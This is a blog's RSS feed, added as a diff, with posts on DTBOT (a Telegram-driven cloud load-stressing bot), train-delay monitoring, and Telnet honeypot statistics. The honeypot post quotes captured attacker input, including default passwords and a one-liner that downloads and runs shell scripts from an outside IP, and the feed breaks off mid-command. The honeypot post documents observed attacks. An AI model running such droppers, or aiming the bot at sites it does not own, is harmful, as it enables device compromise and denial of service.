@@ -1,0 +1,857 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[sami.pw]]></title><description><![CDATA[a new blog site]]></description><link>http://github.com/dylang/node-rss</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 18 May 2020 23:54:27 GMT</lastBuildDate><item><title><![CDATA[Loadstressing from the cloud with DTBOT]]></title><description><![CDATA[<p>Today i finally decided to opensource some of my code created to reach my maximum level of lazyness, Automatically loadstressing web infrastructures via Telegram. <br>
+The other challenge was to see/prove if Golang can be a replacement/alternative for Python scripting.<br><br></p>
+<p>Repo: <a href='https://github.com/fnzv/DTBOT'>https://github.com/fnzv/DTBOT</a></p>
+<p>Here is the diagram to better explain what i wanted to do:</p>
+<p><img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/dtbot-diagram.png">
+<br>
+<em>Disclaimer before i even start</em> <br>
+I'm not responsible for anything you do with this tool, this was made only for legit web loadstressing/benchmarking YOUR OWN infra. <br>
+I know that most of the code can be written more efficently/well, don't hate on my exec_shell() ahah  <br>
+<em>end of disclamer</em> <br></p>
+<p><br><br><br> </p>
+<h2>The main "ingredients" are:</h2>
+<ul>
+<li>Ansible <br></li>
+<li>Golang <br></li>
+<li>Telegram <br></li>
+<li>At least one cloud provider with some resources <br>
+<br><br></li>
+</ul>
+<p>It all starts from the Telegram Bot that keeps listening commands from the allowed "chat_id" configured and whenever a predefined command is sent the bot (Written in Golang) runs the Ansible playbook with extra args and gives feedback
+to the user via Telegram. <br></p>
+<p>This is a classic example for load stressing from Openstack using DTBOT: <br></p>
+<ol>
+<li>User writes to Loadstresser bot chat "/create 5" which triggers the bot to execute the underlying Ansible playbook to deploy 5 VMs on the Openstack Configured Credendials. <br>
+If you check the logs (/var/log/dtbot.log) with a small Ansible background you can understand what's really happening:  <br>
+<code class="language-text">2018/05/19 14:35:46 Command: source /etc/dtbot/os_creds &amp;&amp; ansible_python_interpreter=/usr/bin/python3 ANSIBLE_HOST_KEY_CHECKING=False ansible-playbook -vv /etc/dtbot/playbooks/create-infra.yaml --extra-vars=&quot;total_nodes=5 telegramtoken=botTOKEN telegramchatid=CHATID&quot;</code></li>
+<li>After a few minutes User recieves feedback that VMs are ready and can start loadstressing with: <code class="language-text">/load http://example.org &lt;Num clients&gt; &lt;Num VMs involved&gt; &lt;Time in seconds&gt;</code>  <br></li>
+</ol>
+<p>The defined command /load was created for simplicity and uses WRK (<a href="https://github.com/wg/wrk">https://github.com/wg/wrk</a>) as a stresser which works great out of the box without complex configuration files. <br></p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/dtbot-telegram.jpg?raw=true" width="260" height="500" alt="Sublime&apos;s custom image">
+</p>
+<p>After some time passed loadstressing i decided to add a bit of complexity with Jmeter configurations and custom bash scripts so any User can configure or use it's own loadstressing tool (jmeter, vegeta, nghttp2, locust.io ..). <br><br></p>
+<p>The defined commands for custom Jmeter scripts are /loadj (Openstack) and /loadj_aws (AWS) which follows the exact previous work flow (Telegram -> Golang -> Ansible) but loads a remote configuration file (.jmx in case of Jmeter) and executes the tool with the custom configuration file.  <br></p>
+<p>Note: The remote configuration file must be RAW (gist/any pastebin can be used for this). <br></p>
+<p>Example: /loadj <Remote Jmeter RAW configuration> <Number of Openstack nodes to use>  or /loadj_aws <Remote Jmeter RAW configuration> (to run jmx conf on all AWS nodes) <br></p>
+<p>You can find a simple .jmx example inside the repo under examples/ <br></p>
+<p>If you reached that point and you still asking what DT stands for.. well it's just "DownTime" :) <br></p>
+<p><br><br></p>
+<h2>Brief How To/Usage (more info on github repo):</h2>
+<ol>
+<li>Create a bot and save the bot Token, you can do it by writing "/newbot" to BotFather (<a href="https://telegram.me/botfather">https://telegram.me/botfather</a>)</li>
+<li>
+<p>Use the Quick-Install of dtbot on a Ubuntu 16.04 machine and configure it.
+Required configuration files are located under <code class="language-text">/etc/dtbot/</code> : <br></p>
+<ul>
+<li>dtbot.conf ( Chat ID and Telegram Token, to find what chat id you have just write some messages to your bot and then open from the browser this url: <a href="https://api.telegram.org/bot">https://api.telegram.org/bot</a><token>/getUpdates ) <br></li>
+<li>os_creds (if you want to create VMs on the Openstack Provider) - Openstack credential source file <br></li>
+<li>aws_creds` (if you want to create VMs on AWS) - AWS ACCESS and SECRET key source file (you just need the exports for those enviroment variables) <br></li>
+</ul>
+</li>
+<li>(re)start dtbot via systemd: service dtbot restart <br>
+If everything is fine you should see "Authorized on account BOT_NAME" on /var/log/dtbot <br></li>
+</ol>
+<p>3.5) Take some time to adjust the Ansible Playbooks based on your cloud enviroment (AWS or Openstack): <br></p>
+<ul>
+<li><code class="language-text">/etc/dtbot/playbooks/aws-create-infra.yaml</code> - You can keep it as-is but you need to change the "key_name:" with one present in your account, this VM should be able to SSH into newly created AWS instances with this key so generate a new key on the machine and add it to AWS) <br></li>
+<li><code class="language-text">/etc/dtbot/playbooks/create-infra.yaml</code> - The only part that needs to be changes is the "flavor:" and "image:" name wich changes based on the Openstack provider <br></li>
+<li>Other changes that might be done are always the same but on also the other playbooks: info.yaml,ddos.yaml (Openstack flavor,image) <br></li>
+<li>
+<p>Try to send some commands to your Telegram Bot:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">/help - shows the command list
+/create N - Deploys N VMs on Openstack, multiple runs won&#39;t deploy more VMs but just checks is N VM is present
+/create_aws N - Deploys N VM on AWS, multiple runs will deploy more VMs
+/stop N - Stops loadstressing tasks on N VMs (Openstack)
+/stop_aws - Stops all loadstressing tasks on ALL AWS VMs 
+/destroy N - Deletes N VMs created on Openstack (0 to N)
+/destroy_aws - Deletes ALL loadstressing VMs created on AWS (Will just shutoff all VMs accessible by the dtbot key and therefore will be deleted because of &#39;delete on shutoff&#39;)
+/load &lt;URL&gt; &lt;Num clients&gt; &lt;Num VMs involved&gt; &lt;Time in seconds&gt; - Start load stressing on Openstack N VMs
+/load_aws &lt;URL&gt; &lt;Num clients&gt; &lt;Time in seconds&gt; - Start load stressing on ALL AWS create VMs
+/loadj &lt;URL&gt; &lt;Num VMs involved&gt; - Executes given JMX Jmeter script on N VMs (Openstack), URL must be raw and displaying directly the text
+/loadj_aws &lt;URL&gt; - Executes given JMX Jmeter script on all AWS VMs, URL must be raw and displaying directly the text
+/load_custom &lt;URL&gt; &lt;Total nodes&gt; - Executes custom bash script provided on Openstack VMs, URL must be raw and displaying directly the text
+/load_custom_aws &lt;URL&gt; - Executes custom bash script provided on all AWS VMs, URL must be raw and displaying directly the text
+/info N - Gathers info on N VMs on Openstack (Established connections and ifconfig stats), useful to check current stresstest status. (Example: start /load then after all the VMs started check /info N to see stats/data)</code></pre></div>
+</li>
+<li>Start loadstressing and tune your infra cache,db &#x26; webserver... repeat :) <br><br>
+<img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/dtbot-requests.png"></li>
+</ul>
+<p>Pro-Tips:</p>
+<ul>
+<li>The bot can be added to Telegram Groups and accept commands from all members of the group, just find out the chat_id of the group and add it into the dtbot.conf</li>
+<li>Check the logs on /var/log/dtbot.log to see what's happening and in case change parameters/values on ansible playbooks.</li>
+<li>Execute manually Ansible on the dtbot VM to see if something is wrong (ansible-playbook -vv, you can copy/paste the command from the logs)</li>
+<li>On AWS use a different region from your production env</li>
+</ul>]]></description><link>https://sami.pw/blog/2018-05-27-loadstressing-from-cloud</link><guid isPermaLink="false">https://sami.pw/blog/2018-05-27-loadstressing-from-cloud</guid><pubDate>Sun, 27 May 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Today i finally decided to opensource some of my code created to reach my maximum level of lazyness, Automatically loadstressing web infrastructures via Telegram. &lt;br&gt;
+The other challenge was to see/prove if Golang can be a replacement/alternative for Python scripting.&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Repo: &lt;a href=&apos;https://github.com/fnzv/DTBOT&apos;&gt;https://github.com/fnzv/DTBOT&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Here is the diagram to better explain what i wanted to do:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/dtbot-diagram.png&quot;&gt;
+&lt;br&gt;
+&lt;em&gt;Disclaimer before i even start&lt;/em&gt; &lt;br&gt;
+I&apos;m not responsible for anything you do with this tool, this was made only for legit web loadstressing/benchmarking YOUR OWN infra. &lt;br&gt;
+I know that most of the code can be written more efficently/well, don&apos;t hate on my exec_shell() ahah  &lt;br&gt;
+&lt;em&gt;end of disclamer&lt;/em&gt; &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;/p&gt;
+&lt;h2&gt;The main &quot;ingredients&quot; are:&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Ansible &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Golang &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Telegram &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;At least one cloud provider with some resources &lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It all starts from the Telegram Bot that keeps listening commands from the allowed &quot;chat_id&quot; configured and whenever a predefined command is sent the bot (Written in Golang) runs the Ansible playbook with extra args and gives feedback
+to the user via Telegram. &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;This is a classic example for load stressing from Openstack using DTBOT: &lt;br&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;User writes to Loadstresser bot chat &quot;/create 5&quot; which triggers the bot to execute the underlying Ansible playbook to deploy 5 VMs on the Openstack Configured Credendials. &lt;br&gt;
+If you check the logs (/var/log/dtbot.log) with a small Ansible background you can understand what&apos;s really happening:  &lt;br&gt;
+&lt;code class=&quot;language-text&quot;&gt;2018/05/19 14:35:46 Command: source /etc/dtbot/os_creds &amp;amp;&amp;amp; ansible_python_interpreter=/usr/bin/python3 ANSIBLE_HOST_KEY_CHECKING=False ansible-playbook -vv /etc/dtbot/playbooks/create-infra.yaml --extra-vars=&amp;quot;total_nodes=5 telegramtoken=botTOKEN telegramchatid=CHATID&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;After a few minutes User recieves feedback that VMs are ready and can start loadstressing with: &lt;code class=&quot;language-text&quot;&gt;/load http://example.org &amp;lt;Num clients&amp;gt; &amp;lt;Num VMs involved&amp;gt; &amp;lt;Time in seconds&amp;gt;&lt;/code&gt;  &lt;br&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The defined command /load was created for simplicity and uses WRK (&lt;a href=&quot;https://github.com/wg/wrk&quot;&gt;https://github.com/wg/wrk&lt;/a&gt;) as a stresser which works great out of the box without complex configuration files. &lt;br&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/dtbot-telegram.jpg?raw=true&quot; width=&quot;260&quot; height=&quot;500&quot; alt=&quot;Sublime&amp;apos;s custom image&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;After some time passed loadstressing i decided to add a bit of complexity with Jmeter configurations and custom bash scripts so any User can configure or use it&apos;s own loadstressing tool (jmeter, vegeta, nghttp2, locust.io ..). &lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;The defined commands for custom Jmeter scripts are /loadj (Openstack) and /loadj_aws (AWS) which follows the exact previous work flow (Telegram -&gt; Golang -&gt; Ansible) but loads a remote configuration file (.jmx in case of Jmeter) and executes the tool with the custom configuration file.  &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Note: The remote configuration file must be RAW (gist/any pastebin can be used for this). &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Example: /loadj &lt;Remote Jmeter RAW configuration&gt; &lt;Number of Openstack nodes to use&gt;  or /loadj_aws &lt;Remote Jmeter RAW configuration&gt; (to run jmx conf on all AWS nodes) &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;You can find a simple .jmx example inside the repo under examples/ &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;If you reached that point and you still asking what DT stands for.. well it&apos;s just &quot;DownTime&quot; :) &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;h2&gt;Brief How To/Usage (more info on github repo):&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Create a bot and save the bot Token, you can do it by writing &quot;/newbot&quot; to BotFather (&lt;a href=&quot;https://telegram.me/botfather&quot;&gt;https://telegram.me/botfather&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use the Quick-Install of dtbot on a Ubuntu 16.04 machine and configure it.
+Required configuration files are located under &lt;code class=&quot;language-text&quot;&gt;/etc/dtbot/&lt;/code&gt; : &lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;dtbot.conf ( Chat ID and Telegram Token, to find what chat id you have just write some messages to your bot and then open from the browser this url: &lt;a href=&quot;https://api.telegram.org/bot&quot;&gt;https://api.telegram.org/bot&lt;/a&gt;&lt;token&gt;/getUpdates ) &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;os_creds (if you want to create VMs on the Openstack Provider) - Openstack credential source file &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;aws_creds` (if you want to create VMs on AWS) - AWS ACCESS and SECRET key source file (you just need the exports for those enviroment variables) &lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;(re)start dtbot via systemd: service dtbot restart &lt;br&gt;
+If everything is fine you should see &quot;Authorized on account BOT_NAME&quot; on /var/log/dtbot &lt;br&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;3.5) Take some time to adjust the Ansible Playbooks based on your cloud enviroment (AWS or Openstack): &lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;/etc/dtbot/playbooks/aws-create-infra.yaml&lt;/code&gt; - You can keep it as-is but you need to change the &quot;key_name:&quot; with one present in your account, this VM should be able to SSH into newly created AWS instances with this key so generate a new key on the machine and add it to AWS) &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;/etc/dtbot/playbooks/create-infra.yaml&lt;/code&gt; - The only part that needs to be changes is the &quot;flavor:&quot; and &quot;image:&quot; name wich changes based on the Openstack provider &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Other changes that might be done are always the same but on also the other playbooks: info.yaml,ddos.yaml (Openstack flavor,image) &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Try to send some commands to your Telegram Bot:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;/help - shows the command list
+/create N - Deploys N VMs on Openstack, multiple runs won&amp;#39;t deploy more VMs but just checks is N VM is present
+/create_aws N - Deploys N VM on AWS, multiple runs will deploy more VMs
+/stop N - Stops loadstressing tasks on N VMs (Openstack)
+/stop_aws - Stops all loadstressing tasks on ALL AWS VMs 
+/destroy N - Deletes N VMs created on Openstack (0 to N)
+/destroy_aws - Deletes ALL loadstressing VMs created on AWS (Will just shutoff all VMs accessible by the dtbot key and therefore will be deleted because of &amp;#39;delete on shutoff&amp;#39;)
+/load &amp;lt;URL&amp;gt; &amp;lt;Num clients&amp;gt; &amp;lt;Num VMs involved&amp;gt; &amp;lt;Time in seconds&amp;gt; - Start load stressing on Openstack N VMs
+/load_aws &amp;lt;URL&amp;gt; &amp;lt;Num clients&amp;gt; &amp;lt;Time in seconds&amp;gt; - Start load stressing on ALL AWS create VMs
+/loadj &amp;lt;URL&amp;gt; &amp;lt;Num VMs involved&amp;gt; - Executes given JMX Jmeter script on N VMs (Openstack), URL must be raw and displaying directly the text
+/loadj_aws &amp;lt;URL&amp;gt; - Executes given JMX Jmeter script on all AWS VMs, URL must be raw and displaying directly the text
+/load_custom &amp;lt;URL&amp;gt; &amp;lt;Total nodes&amp;gt; - Executes custom bash script provided on Openstack VMs, URL must be raw and displaying directly the text
+/load_custom_aws &amp;lt;URL&amp;gt; - Executes custom bash script provided on all AWS VMs, URL must be raw and displaying directly the text
+/info N - Gathers info on N VMs on Openstack (Established connections and ifconfig stats), useful to check current stresstest status. (Example: start /load then after all the VMs started check /info N to see stats/data)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;Start loadstressing and tune your infra cache,db &amp;#x26; webserver... repeat :) &lt;br&gt;&lt;br&gt;
+&lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/dtbot-requests.png&quot;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Pro-Tips:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The bot can be added to Telegram Groups and accept commands from all members of the group, just find out the chat_id of the group and add it into the dtbot.conf&lt;/li&gt;
+&lt;li&gt;Check the logs on /var/log/dtbot.log to see what&apos;s happening and in case change parameters/values on ansible playbooks.&lt;/li&gt;
+&lt;li&gt;Execute manually Ansible on the dtbot VM to see if something is wrong (ansible-playbook -vv, you can copy/paste the command from the logs)&lt;/li&gt;
+&lt;li&gt;On AWS use a different region from your production env&lt;/li&gt;
+&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Monitoring trains the sysadmin way]]></title><description><![CDATA[<p>After discovering that the site viaggiatreno.it and lefreccie.it kindly offers some API to their train data i decided to implement my own monitoring system to get a complete overview of what is happening
+in the public train system and never miss a train.<br><br></p>
+<p><img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/grafana-dash.png"></p>
+<p><br><br><br> </p>
+<h2>Master Plan:</h2>
+<ol>
+<li>Scrape all data available (Train departure/arrival,delays,stations....) <br></li>
+<li>Standardize the format so i can implement pluggable systems (Grafana, Telegram Bot, Website, Twitter..)<br></li>
+<li>At least have fun when i hear "We are sorry for the inconvenience" while i check my systems<br>
+<br><br></li>
+</ol>
+<h2>Scraping all the relevant datasets<br></h2>
+<p>All the data is collected with a script every 30 minutes using as input the site APIs and station lists, the ouput will be saved into InfluxDB (Legit, delay time tracking with timeseries DBs)
+and a local folder for historical data that i will use later with git.<br>
+<br><br> </p>
+<h2>Standardize format <br></h2>
+<p>To allow multiple systems comunicate together you always need to take raw data (train datasets) and standardize it into a more pluggable format:</p>
+<ul>
+<li>InfluxDB  (Pros: A lot of client support, Grafana, Alerts, SQL...  Cons: Some more resources usage)</li>
+<li>Git+Local (Pros: Efficent historical data tracking and easy full-text search...  Cons: None)
+<br><br> </li>
+</ul>
+<h2>Developing "Pluggable" systems:<br></h2>
+<ul>
+<li>The Grafana Dashboard gathers all the relevant metrics that i cherry picked from InfluxDB (Train departure/arrival, delay, last station detected, train number, timestamp).
+With this datasets i could easily create a dashboard that can really give you all the information that you can see on station information display sistems.
+<br><br> <img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/delays-dash.png"> <br></li>
+<li>The telegram bot <a href="https://t.me/Trenordalerts_bot">https://t.me/Trenordalerts_bot</a> is written in Go and with under 300 lines of code is it possible to read all the collected data of delays and comunicate them to the user.
+The alerting part of the bot is more complex than the "Give me info of xyz train" because i need to identify the user before sending an alert (obvious.. i don't want to recieve alerts of my friend's train) so i implemented
+a connector with a relational DB where i track chat_ids and alerts. <br></li>
+<li>Static Website <a href="https://trenistats.it/">https://trenistats.it</a> <br>
+This is where the magic happens <a href="https://d3js.org/"></a>, the flow of the data is very simple now and i just need to gather data from one of my inputs (InfluxDB,Git or Local Dir) and show some graphs.
+How?
+The html code is automatically generated via a running script that collects the data from the local repo and generates the index.html for the static site.
+Even if i'm not a frontend specialist i managed to make something cool out of it (pure google fu skills and design 101)</li>
+<li>Twitter bot <a href="https://twitter.com/trenistats">https://twitter.com/trenistats</a> <br>
+The bot gathers information from the local repo and triggers alerts via Twitter APIs if trains start/have long delays and tagging the main italian company that's responsible for the transportation system.
+Like the Telegram bot this is written in Go with very few lines, basicaly take what i have already did for Telegram + Twitter API integration.
+<br><br></li>
+</ul>
+<p>That's it, i could have gone far into dashboarding and alerting but this setup seems to work fine for me. <br>
+I tried integrating Elasticsearch + Kibana for more fun stuff but Influx + Grafana did the job very well (it just works.. and no json decoding fights). <br></p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/jsonmeme.jpeg?raw=true" alt="Sublime&apos;s custom image">
+</p>]]></description><link>https://sami.pw/blog/2018-03-10-Monitoring-trains</link><guid isPermaLink="false">https://sami.pw/blog/2018-03-10-Monitoring-trains</guid><pubDate>Sat, 10 Mar 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;After discovering that the site viaggiatreno.it and lefreccie.it kindly offers some API to their train data i decided to implement my own monitoring system to get a complete overview of what is happening
+in the public train system and never miss a train.&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/grafana-dash.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;/p&gt;
+&lt;h2&gt;Master Plan:&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Scrape all data available (Train departure/arrival,delays,stations....) &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Standardize the format so i can implement pluggable systems (Grafana, Telegram Bot, Website, Twitter..)&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;At least have fun when i hear &quot;We are sorry for the inconvenience&quot; while i check my systems&lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;Scraping all the relevant datasets&lt;br&gt;&lt;/h2&gt;
+&lt;p&gt;All the data is collected with a script every 30 minutes using as input the site APIs and station lists, the ouput will be saved into InfluxDB (Legit, delay time tracking with timeseries DBs)
+and a local folder for historical data that i will use later with git.&lt;br&gt;
+&lt;br&gt;&lt;br&gt; &lt;/p&gt;
+&lt;h2&gt;Standardize format &lt;br&gt;&lt;/h2&gt;
+&lt;p&gt;To allow multiple systems comunicate together you always need to take raw data (train datasets) and standardize it into a more pluggable format:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;InfluxDB  (Pros: A lot of client support, Grafana, Alerts, SQL...  Cons: Some more resources usage)&lt;/li&gt;
+&lt;li&gt;Git+Local (Pros: Efficent historical data tracking and easy full-text search...  Cons: None)
+&lt;br&gt;&lt;br&gt; &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Developing &quot;Pluggable&quot; systems:&lt;br&gt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;The Grafana Dashboard gathers all the relevant metrics that i cherry picked from InfluxDB (Train departure/arrival, delay, last station detected, train number, timestamp).
+With this datasets i could easily create a dashboard that can really give you all the information that you can see on station information display sistems.
+&lt;br&gt;&lt;br&gt; &lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/delays-dash.png&quot;&gt; &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;The telegram bot &lt;a href=&quot;https://t.me/Trenordalerts_bot&quot;&gt;https://t.me/Trenordalerts_bot&lt;/a&gt; is written in Go and with under 300 lines of code is it possible to read all the collected data of delays and comunicate them to the user.
+The alerting part of the bot is more complex than the &quot;Give me info of xyz train&quot; because i need to identify the user before sending an alert (obvious.. i don&apos;t want to recieve alerts of my friend&apos;s train) so i implemented
+a connector with a relational DB where i track chat_ids and alerts. &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Static Website &lt;a href=&quot;https://trenistats.it/&quot;&gt;https://trenistats.it&lt;/a&gt; &lt;br&gt;
+This is where the magic happens &lt;a href=&quot;https://d3js.org/&quot;&gt;&lt;/a&gt;, the flow of the data is very simple now and i just need to gather data from one of my inputs (InfluxDB,Git or Local Dir) and show some graphs.
+How?
+The html code is automatically generated via a running script that collects the data from the local repo and generates the index.html for the static site.
+Even if i&apos;m not a frontend specialist i managed to make something cool out of it (pure google fu skills and design 101)&lt;/li&gt;
+&lt;li&gt;Twitter bot &lt;a href=&quot;https://twitter.com/trenistats&quot;&gt;https://twitter.com/trenistats&lt;/a&gt; &lt;br&gt;
+The bot gathers information from the local repo and triggers alerts via Twitter APIs if trains start/have long delays and tagging the main italian company that&apos;s responsible for the transportation system.
+Like the Telegram bot this is written in Go with very few lines, basicaly take what i have already did for Telegram + Twitter API integration.
+&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That&apos;s it, i could have gone far into dashboarding and alerting but this setup seems to work fine for me. &lt;br&gt;
+I tried integrating Elasticsearch + Kibana for more fun stuff but Influx + Grafana did the job very well (it just works.. and no json decoding fights). &lt;br&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/master/imgs/jsonmeme.jpeg?raw=true&quot; alt=&quot;Sublime&amp;apos;s custom image&quot;&gt;
+&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Some (fun) stats from a running Telnet honeypot (YAFH)]]></title><description><![CDATA[<p>Telnet sessions:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">netstat -peanut | grep 23 | grep ESTABLISHED | wc -l
+185</code></pre></div>
+<br>
+<p>Total connection recieved last month:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">grep CONNECTION yafh-telnet.log  | wc -l
+644</code></pre></div>
+<br>
+<p>Most common wget/busybox attempt (Dont run it...i implemented accidental copy-pasta protection here #):<br></p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text"># /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne &#39;\x0181c46036\x7f&#39;; /bin/busybox printf &#39;\00281c46036\177&#39;; /bin/echo -ne &#39;\x0381c46036\x7f&#39;; /usr/bin/printf &#39;\00481c46036\177&#39;; </code></pre></div>
+<br>
+<p>Top 15 password used (The honeypot was designed to allow any password access):</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text"> &lt;empty&gt; 
+ 1234
+ password
+ admin
+ 12345
+ 1234
+ Win1doW$
+ user
+ pass
+ aquario (??Really??)
+ admin
+ 888888
+ 7ujMko0admin
+ 666666
+ 5up
+ 54321
+ 1234567890
+ 123456
+ 1111
+ 12345</code></pre></div>
+<p>One-liner of the year goes to:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin
+wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin
+wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin
